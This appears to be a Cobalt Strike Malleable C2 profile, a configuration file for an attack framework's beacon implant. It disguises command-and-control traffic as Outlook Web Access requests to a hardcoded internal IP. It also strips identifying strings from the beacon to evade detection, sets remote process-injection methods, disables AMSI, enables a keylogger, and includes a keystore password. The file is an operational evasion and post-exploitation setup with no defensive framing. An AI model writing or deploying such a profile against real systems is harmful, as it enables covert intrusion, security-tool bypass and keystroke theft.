
set host_stage "true";
set sleeptime "63000";
set jitter    "14";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4063.0 Safari/537.36 Edg/82.0.439.1";

# Task and Proxy Max Size
set tasks_max_size "1048576";
set tasks_proxy_max_size "921600";
set tasks_dns_proxy_max_size "71680";

set data_jitter "50";
set smb_frame_header "";
set pipename "epmapper-4377";
set pipename_stager "epmapper-2432";

set tcp_frame_header "";
set ssh_banner "Welcome to Ubuntu 19.10.0 LTS (GNU/Linux 4.4.0-19037-aws x86_64)";
set ssh_pipename "epmapper-##";

####Manaully add these if your doing C2 over DNS (Future Release)####
##dns-beacon {
#    set dns_idle             "1.2.3.4";
#    set dns_max_txt          "199";
#    set dns_sleep            "1";
#    set dns_ttl              "5";
#    set maxdns               "200";
#    set dns_stager_prepend   "doc-stg-prepend";
#    set dns_stager_subhost   "doc-stg-sh.";

#    set beacon               "doc.bc.";
#    set get_A                "doc.1a.";
#    set get_AAAA             "doc.4a.";
#    set get_TXT              "doc.tx.";
#    set put_metadata         "doc.md.";
#    set put_output           "doc.po.";
#    set ns_response          "zero";

#}



stage {
	set obfuscate "true";
	set stomppe "true";
	set cleanup "true";
	set userwx "false";
	set smartinject "true";
	

	#TCP and SMB beacons will obfuscate themselves while they wait for a new connection.
	#They will also obfuscate themselves while they wait to read information from their parent Beacon.
	set sleep_mask "true";
	

	set checksum       "0";
	set compile_time   "02 Feb 2020 19:59:15";
	set entry_point    "1056672";
	set image_size_x86 "1785856";
	set image_size_x64 "1785856";
	set name           "WWANSVC.DLL";
	set rich_header    "\x77\xf3\x15\x7d\x33\x92\x7b\x2e\x33\x92\x7b\x2e\x33\x92\x7b\x2e\x3a\xea\xe8\x2e\xb3\x92\x7b\x2e\x68\xfa\x7f\x2f\x3c\x92\x7b\x2e\x68\xfa\x78\x2f\x30\x92\x7b\x2e\x68\xfa\x7e\x2f\x2d\x92\x7b\x2e\x33\x92\x7a\x2e\xf8\x97\x7b\x2e\x68\xfa\x7a\x2f\x3e\x92\x7b\x2e\x68\xfa\x7b\x2f\x32\x92\x7b\x2e\x68\xfa\x72\x2f\xa9\x92\x7b\x2e\x68\xfa\x86\x2e\x32\x92\x7b\x2e\x68\xfa\x84\x2e\x32\x92\x7b\x2e\x68\xfa\x79\x2f\x32\x92\x7b\x2e\x52\x69\x63\x68\x33\x92\x7b\x2e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
	
	
	
	transform-x86 {
		prepend "\x90\x90\x90"; # NOP, NOP!
		strrep "ReflectiveLoader" "";
		strrep "This program cannot be run in DOS mode" "";
		strrep "NtQueueApcThread" "";
		strrep "HTTP/1.1 200 OK" "";
		strrep "Stack memory was corrupted" "";
		strrep "beacon.dll" "";
		strrep "ADVAPI32.dll" "";
		strrep "WININET.dll" "";
		strrep "WS2_32.dll" "";
		strrep "DNSAPI.dll" "";
		strrep "Secur32.dll" "";
		strrep "VirtualProtectEx" "";
		strrep "VirtualProtect" "";
		strrep "VirtualAllocEx" "";
		strrep "VirtualAlloc" "";
		strrep "VirtualFree" "";
		strrep "VirtualQuery" "";
		strrep "RtlVirtualUnwind" "";
		strrep "sAlloc" "";
		strrep "FlsFree" "";
		strrep "FlsGetValue" "";
		strrep "FlsSetValue" "";
		strrep "InitializeCriticalSectionEx" "";
		strrep "CreateSemaphoreExW" "";
		strrep "SetThreadStackGuarantee" "";
		strrep "CreateThreadpoolTimer" "";
		strrep "SetThreadpoolTimer" "";
		strrep "WaitForThreadpoolTimerCallbacks" "";
		strrep "CloseThreadpoolTimer" "";
		strrep "CreateThreadpoolWait" "";
		strrep "SetThreadpoolWait" "";
		strrep "CloseThreadpoolWait" "";
		strrep "FlushProcessWriteBuffers" "";
		strrep "FreeLibraryWhenCallbackReturns" "";
		strrep "GetCurrentProcessorNumber" "";
		strrep "GetLogicalProcessorInformation" "";
		strrep "CreateSymbolicLinkW" "";
		strrep "SetDefaultDllDirectories" "";
		strrep "EnumSystemLocalesEx" "";
		strrep "CompareStringEx" "";
		strrep "GetDateFormatEx" "";
		strrep "GetLocaleInfoEx" "";
		strrep "GetTimeFormatEx" "";
		strrep "GetUserDefaultLocaleName" "";
		strrep "IsValidLocaleName" "";
		strrep "LCMapStringEx" "";
		strrep "GetCurrentPackageId" "";
		strrep "UNICODE" "";
		strrep "UTF-8" "";
		strrep "UTF-16LE" "";
		strrep "MessageBoxW" "";
		strrep "GetActiveWindow" "";
		strrep "GetLastActivePopup" "";
		strrep "GetUserObjectInformationW" "";
		strrep "GetProcessWindowStation" "";
		strrep "Sunday" "";
		strrep "Monday" "";
		strrep "Tuesday" "";
		strrep "Wednesday" "";
		strrep "Thursday" "";
		strrep "Friday" "";
		strrep "Saturday" "";
		strrep "January" "";
		strrep "February" "";
		strrep "March" "";
		strrep "April" "";
		strrep "June" "";
		strrep "July" "";
		strrep "August" "";
		strrep "September" "";
		strrep "October" "";
		strrep "November" "";
		strrep "December" "";
		strrep "MM/dd/yy" "";
		strrep "Stack memory around _alloca was corrupted" "";
		strrep "Unknown Runtime Check Error" "";
		strrep "Unknown Filename" "";
		strrep "Unknown Module Name" "";
		strrep "Run-Time Check Failure #%d - %s" "";
		strrep "Stack corrupted near unknown variable" "";
		strrep "Stack pointer corruption" "";
		strrep "Cast to smaller type causing loss of data" "";
		strrep "Stack memory corruption" "";
		strrep "Local variable used before initialization" "";
		strrep "Stack around _alloca corrupted" "";
		strrep "RegOpenKeyExW" "";
		strrep "egQueryValueExW" "";
		strrep "RegCloseKey" "";
		strrep "LibTomMath" "";
		strrep "Wow64DisableWow64FsRedirection" "";
		strrep "Wow64RevertWow64FsRedirection" "";
		strrep "Kerberos" "";

		}

	transform-x64 {
		prepend "\x90\x90\x90"; # NOP, NOP!
		strrep "ReflectiveLoader" "";
		strrep "This program cannot be run in DOS mode" "";
		strrep "beacon.x64.dll" "";
		strrep "NtQueueApcThread" "";
		strrep "HTTP/1.1 200 OK" "";
		strrep "Stack memory was corrupted" "";
		strrep "beacon.dll" "";
		strrep "ADVAPI32.dll" "";
		strrep "WININET.dll" "";
		strrep "WS2_32.dll" "";
		strrep "DNSAPI.dll" "";
		strrep "Secur32.dll" "";
		strrep "VirtualProtectEx" "";
		strrep "VirtualProtect" "";
		strrep "VirtualAllocEx" "";
		strrep "VirtualAlloc" "";
		strrep "VirtualFree" "";
		strrep "VirtualQuery" "";
		strrep "RtlVirtualUnwind" "";
		strrep "sAlloc" "";
		strrep "FlsFree" "";
		strrep "FlsGetValue" "";
		strrep "FlsSetValue" "";
		strrep "InitializeCriticalSectionEx" "";
		strrep "CreateSemaphoreExW" "";
		strrep "SetThreadStackGuarantee" "";
		strrep "CreateThreadpoolTimer" "";
		strrep "SetThreadpoolTimer" "";
		strrep "WaitForThreadpoolTimerCallbacks" "";
		strrep "CloseThreadpoolTimer" "";
		strrep "CreateThreadpoolWait" "";
		strrep "SetThreadpoolWait" "";
		strrep "CloseThreadpoolWait" "";
		strrep "FlushProcessWriteBuffers" "";
		strrep "FreeLibraryWhenCallbackReturns" "";
		strrep "GetCurrentProcessorNumber" "";
		strrep "GetLogicalProcessorInformation" "";
		strrep "CreateSymbolicLinkW" "";
		strrep "SetDefaultDllDirectories" "";
		strrep "EnumSystemLocalesEx" "";
		strrep "CompareStringEx" "";
		strrep "GetDateFormatEx" "";
		strrep "GetLocaleInfoEx" "";
		strrep "GetTimeFormatEx" "";
		strrep "GetUserDefaultLocaleName" "";
		strrep "IsValidLocaleName" "";
		strrep "LCMapStringEx" "";
		strrep "GetCurrentPackageId" "";
		strrep "UNICODE" "";
		strrep "UTF-8" "";
		strrep "UTF-16LE" "";
		strrep "MessageBoxW" "";
		strrep "GetActiveWindow" "";
		strrep "GetLastActivePopup" "";
		strrep "GetUserObjectInformationW" "";
		strrep "GetProcessWindowStation" "";
		strrep "Sunday" "";
		strrep "Monday" "";
		strrep "Tuesday" "";
		strrep "Wednesday" "";
		strrep "Thursday" "";
		strrep "Friday" "";
		strrep "Saturday" "";
		strrep "January" "";
		strrep "February" "";
		strrep "March" "";
		strrep "April" "";
		strrep "June" "";
		strrep "July" "";
		strrep "August" "";
		strrep "September" "";
		strrep "October" "";
		strrep "November" "";
		strrep "December" "";
		strrep "MM/dd/yy" "";
		strrep "Stack memory around _alloca was corrupted" "";
		strrep "Unknown Runtime Check Error" "";
		strrep "Unknown Filename" "";
		strrep "Unknown Module Name" "";
		strrep "Run-Time Check Failure #%d - %s" "";
		strrep "Stack corrupted near unknown variable" "";
		strrep "Stack pointer corruption" "";
		strrep "Cast to smaller type causing loss of data" "";
		strrep "Stack memory corruption" "";
		strrep "Local variable used before initialization" "";
		strrep "Stack around _alloca corrupted" "";
		strrep "RegOpenKeyExW" "";
		strrep "egQueryValueExW" "";
		strrep "RegCloseKey" "";
		strrep "LibTomMath" "";
		strrep "Wow64DisableWow64FsRedirection" "";
		strrep "Wow64RevertWow64FsRedirection" "";
		strrep "Kerberos" "";
		}
}


process-inject {
    # set remote memory allocation technique
	set allocator "NtMapViewOfSection";

    # shape the content and properties of what we will inject
    set min_alloc "25470";
    set userwx    "false";
    set startrwx "true";

    transform-x86 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # NOP, NOP!
    }

    transform-x64 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # NOP, NOP!
    }

    # specify how we execute code in the remote process
    execute {
		CreateThread "ntdll.dll!RtlUserThreadStart+0x1313";
        NtQueueApcThread-s;
        SetThreadContext;
        CreateRemoteThread;
		CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";
        RtlCreateUserThread;
	}
}

post-ex {
    # control the temporary process we spawn to
	
	set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
	set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";

    # change the permissions and content of our post-ex DLLs
    set obfuscate "true";
 
    # pass key function pointers from Beacon to its child jobs
    set smartinject "true";
 
    # disable AMSI in powerpick, execute-assembly, and psinject
    set amsi_disable "true";
	
	# control the method used to log keystrokes 
	set keylogger "SetWindowsHookEx";
}

	
http-config {

	#set "true" if teamserver is behind redirector
	set trust_x_forwarded_for "false";			
}
http-get {

set uri "/owa/ozlOrFlTUgqX-rf53eoUA3ibbVo7rlHRo ";


client {

header "Host" "10.224.80.34";
header "Accept" "*/*";
header "Cookie" "MicrosoftApplicationsTelemetryDeviceId=95c18d8-4dce9854;ClientId=1C0F6C5D910F9;MSPAuth=3EkAjDKjI;xid=730bf7;wla42=TOdLmya";
	
	metadata {
		base64url;
		parameter "wa";


	}

parameter "path" "/calendar";

}

server {

header "Cache-Control" "no-cache";
header "Pragma" "no-cache";
header "Content-Type" "text/html; charset=utf-8";
header "Server" "Microsoft-IIS/10.0";
header "request-id" "6cfcf35d-0680-4853-98c4-b16723708fc9";
header "X-CalculatedBETarget" "BY2PR06MB549.namprd02.prod.outlook.com";
header "X-Content-Type-Options" "nosniff";
header "X-OWA-Version" "15.1.1240.20";
header "X-OWA-OWSVersion" "V2017_06_15";
header "X-OWA-MinimumSupportedOWSVersion" "V2_6";
header "X-Frame-Options" "SAMEORIGIN";
header "X-DiagInfo" "BY2PR06MB549";
header "X-UA-Compatible" "IE=EmulateIE7";
header "X-Powered-By" "ASP.NET";
header "X-FEServer" "CY4PR02CA0010";
header "Connection" "close";
	

	output {
		base64url;
		print;
	}
}
}

http-post {

set uri "/owa/vJqrCaqXyHwlySsaOaLZf21xI ";

set verb "GET";

client {

header "Host" "10.224.80.34";
header "Accept" "*/*";     
	
	output {
		base64url;
	parameter "wa";


	}



	id {
		base64url;

	prepend "wla42=";
	prepend "xid=730bf7;";
	prepend "MSPAuth=3EkAjDKjI;";
	prepend "ClientId=1C0F6C5D910F9;";
	prepend "MicrosoftApplicationsTelemetryDeviceId=95c18d8-4dce9854;";
	header "Cookie";


	}
}

server {

header "Cache-Control" "no-cache";
header "Pragma" "no-cache";
header "Content-Type" "text/html; charset=utf-8";
header "Server" "Microsoft-IIS/10.0";
header "request-id" "6cfcf35d-0680-4853-98c4-b16723708fc9";
header "X-CalculatedBETarget" "BY2PR06MB549.namprd02.prod.outlook.com";
header "X-Content-Type-Options" "nosniff";
header "X-OWA-Version" "15.1.1240.20";
header "X-OWA-OWSVersion" "V2017_06_15";
header "X-OWA-MinimumSupportedOWSVersion" "V2_6";
header "X-Frame-Options" "SAMEORIGIN";
header "X-DiagInfo" "BY2PR06MB549";
header "X-UA-Compatible" "IE=EmulateIE7";
header "X-Powered-By" "ASP.NET";
header "X-FEServer" "CY4PR02CA0010";
header "Connection" "close";
	

	output {
		base64url;
		print;
	}
}
}

http-stager {

set uri_x86 "/rpc/5831114";
set uri_x64 "/rpc/9613597";

client {
	header "Host" "10.224.80.34";
header "Accept" "*/*";
}

server {
	header "Server" "nginx";    
}


}


	
https-certificate {
set keystore "wanurap.com.store";
set password "7WTF6WxTG8nPKzB5cXXV4t35CPPsUiXmZBSeXDndhjU=";
}

	
